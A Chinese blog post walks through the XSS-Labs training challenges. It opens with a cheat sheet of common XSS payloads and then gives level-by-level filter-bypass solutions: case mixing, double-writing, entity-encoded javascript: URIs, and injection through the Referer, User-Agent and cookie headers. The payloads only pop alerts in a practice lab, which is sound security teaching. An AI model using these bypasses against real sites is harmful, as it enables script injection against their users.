---
title: Xss-Labs通过文档
author: Kilm0r
description: "xss注入备忘录"
pubDate: 2025-06-06
tags: ["安全", "xss", "渗透"]
---

<h1 id="Exg7d">常用payload：</h1>
```javascript
<script>alert("xss")</script>
  
<body onload=alert()>
 
<img src=x onerror=alert()>
 
<svg onload=alert()>
 
<body onpageshow=alert(1)>
 
<div style="width:1000px;height:1000px" onmouseover=alert()></div>
 
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
 
<marquee onstart=alert(1)> (firefox only)
 
<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
 
<input autofocus="" onfocus=alert(1)></input>
 
<details open ontoggle="alert()">  (chrome & opera only)
```

<h2 id="J5B4V">开局：</h2>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692622630-b9fc59c2-4b10-4248-bd55-a68eb7cc474c.png)

<h1 id="lG3OP">第一关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692656119-7bcc933c-e35c-4d8f-bdc4-8dc5fa2594ef.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692689466-128e6459-1693-4bd0-beb6-9217ff927d79.png)

<h1 id="Ee92T">第二关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692815087-1b428890-e8f2-41c0-9017-3b5941f9cfd6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692860224-12c49aab-7b2b-471d-b191-be9f3690506d.png)

闭合前后尖括号使js代码生效

"><script>alert("s")</script><"

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692906568-bfe23aa0-af38-4f83-ae9f-634b7fe9272f.png)

<h1 id="dxW5y">第三关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748692974430-04cef713-3ed9-40a6-8acf-abe3d95cdab1.png)

括号被实体化，尝试更改其他方式代替,<font style="color:rgb(77, 77, 77);">但是htmlspecialchars函数只针对<>（即大于小于号）进行html实体化，我们还可以利用其他方法进行xss注入</font>

```javascript
" onfocus=javascript:alert() "
```

<font style="color:rgb(77, 77, 77);">  
</font><font style="color:rgb(77, 77, 77);"> </font>

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693248102-2394a98b-8636-465e-8bcf-254e2aa16702.png)

<h1 id="BqiRB">第四关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693299936-d6b11e15-6684-4b6d-a897-11c566f55a5d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693364651-8cc752d5-9093-4c5f-b121-f98957ed4f90.png)

括号被实体化，尝试用其他方法绕过，不使用括号

" onfocus=javascript:alert() "

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693415921-8392cd08-7c85-4a60-807f-5665ec32f3cf.png)

<h1 id="nk27O">第五关：</h1>
先用常规语句试探下

<script>alert("xss")</script>

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693476074-a0f7a5a9-8875-45e6-9e14-4d95c0890000.png)

<input name="keyword" value="&lt;scr_ipt&gt;alert(" xss")<="" script="">

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693580737-4db83ec6-df4d-4feb-b7c8-7060cc68bfa5.png)

源码处发现使用str_replace函数，<script>转换为<scr_ipt> on转换为o_n

使用a标签绕过script与on标签

```javascript
"/><a href=javascript:alert()>a-alert</a><"
```

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693680555-c201b65d-247c-4929-87aa-36c18713ed87.png)

<h1 id="BKN09">第六关：</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693701767-90ca1802-b407-4f97-8137-a30fbc7bf788.png)

使用常规语句：<script>alert("xss")</script>试探下

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693768598-286a7db1-df37-4055-9c2b-39d6a0322bb2.png)

源码处的得知script、on、src、data、href被过滤，a标签 script标签不能用

这里可以使用大小写绕过

"><Script>alert("AA")</SCRipt><"

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693893515-e0da28f5-6cfc-4bc2-b1b4-4c5e9f13daf6.png)

<h1 id="DkcjH">Level 7</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693918726-3603d45b-e6e9-4483-b789-afea2831d755.png)![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748693955068-2886656b-0882-4bbf-93d7-6e104d5e9e5d.png)

源码处得知使用strtolower输入被小写，防止大写字母绕过，script、on、src、data、href被过滤

"><SCRscriptIPT>alert("aa")</Scrscriptipt><"

这里我们使用双写绕过，删掉中间标签的同时剩下的标签还能组成新的标签

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694198203-e8bf13ec-3350-460f-b2d4-b6276c9935c7.png)

<h1 id="BGo1C">level 8</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694247444-41d5a63e-8132-4e5c-a26e-61d780ed37b2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694256090-19848ab8-b5ba-4245-bbaa-4a8857b0a984.png)

源码处得知过滤新增了“引号

这里绕过可以使用<font style="color:rgb(77, 77, 77);">href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694319636-045e0fd8-d3df-4ab0-9782-1a303e7f3423.png)

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694338825-d8863254-eeb2-4f51-8daa-7264c0890927.png)

<h1 id="Cdj7L">level 9</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694355285-c912d8b4-933b-48fe-9a69-312bbf04f5a7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694389180-8c84ceb1-24b9-4c73-b8fc-3733c885fe4b.png)

源码处得知不仅过滤了标签script、on、src、data、href、“双引号的同时还增加了判断，判断链接地址是否存在http://

<font style="color:rgb(77, 77, 77);">为了防止false===false，我们需要向传入的值里面添加http://，而且要用注释符注释掉，否则会执行不了、无法弹窗，让函数strpos返回一个数字，构造payload</font>

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */
```

<font style="color:rgb(77, 77, 77);">  
</font><font style="color:rgb(77, 77, 77);"> </font>![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694507907-f10ebe2f-52f2-4e25-a8cc-9d145165828b.png)

<h1 id="aDtkD">Level 10</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694520611-6dd4bd56-3de2-4a8d-b2df-1c81695e224d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694557283-a9c1967b-54e2-41ea-963b-95ef4ba3df3a.png)

源码处得知过滤掉<> <font style="color:rgb(77, 77, 77);">所以我们用onfocus事件，因为这里输入框被隐藏了，需要添加type="text"，构造payload</font>

```javascript
?t_sort=" onfocus=javascript:alert() type="text
```

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694631079-3b2450d8-5344-4bd5-bbdb-729226ab3a06.png)

<h1 id="RTNrK">Level 11</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694654570-284853f8-78b2-4765-96c4-20db025ff4fc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694679986-41944515-8575-43ee-8985-f532355029ce.png)

源码处得知，接收http头信息，同时过滤<>

在头部http_refere部分插入xss代码

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694841769-417a94fa-41c0-4d84-acf4-f7377dd51e60.png)

<h1 id="J7KcJ">Level 12</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748694888845-b90d578a-b567-467e-894a-117bc512d7bf.png)

源码处得知接收http_user_agent浏览器信息，同时过滤<>

我们继续同上方法插入UA头信息测试

```javascript
" onfocus=javascript:alert() type="text
```

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695013999-b62c8694-a878-4c37-93c1-29d3c8f7eb75.png)

<h1 id="HRe86">Level 13</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695051874-f0a0eafa-1492-4e96-8cc0-b64368bbdcbf.png)

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695066091-e217416b-4407-49e2-9a2a-31df46b92c9e.png)

源码处得知接收俩个参数keyword与t_sort同时过滤<>,使用$\_COOKIE["user"]，接收浏览器cookie信息
，同上继续使用onfocus函数，插入cookie位置

```javascript
" onfocus=javascript:alert() type="text
```

<h1 id="SHLf9">level 14</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695305217-f966b248-62e0-4332-9fde-d73347f68eba.png)

这关目前做不了，含义为跳转该网站，在该网站上传存在xss代码图片，跳转到该网站后弹窗，目前该网站已经关闭，本关略过

<h1 id="Y25Dr">Level 15</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695440534-a4146bd1-88fc-4ffc-a51a-b48c0650eed2.png)![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695480191-141e2026-52c8-486a-952e-52b3e55bee04.png)

输出使用ng-include函数包含，可以包含其他文件，这里包含第一个通关文件，之后在第一个文件弹窗

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695520322-72f73906-dde7-4428-9e52-16b98ece61ea.png)

```python
?src='level1.php?name=<img src=XXX onmouseover=alert()>'
```

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695587337-7f1c7f5c-6190-4e10-8441-7c07290c5aa5.png)

<h1 id="cUxQZ">Level 16</h1>
![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695623584-86f575e2-4c87-4fa2-be1f-92c173072d09.png)

源码出得知，是替换script、“、/等符号，

<font style="color:rgb(77, 77, 77);">空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的<img>、<details>、<svg>等标签</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695702619-ff7d7621-4354-46e5-80ac-c50273007946.png)![](https://cdn.nlark.com/yuque/0/2025/png/39176307/1748695756054-19202322-fc4e-4e19-94f0-1e1c1a1bb210.png)
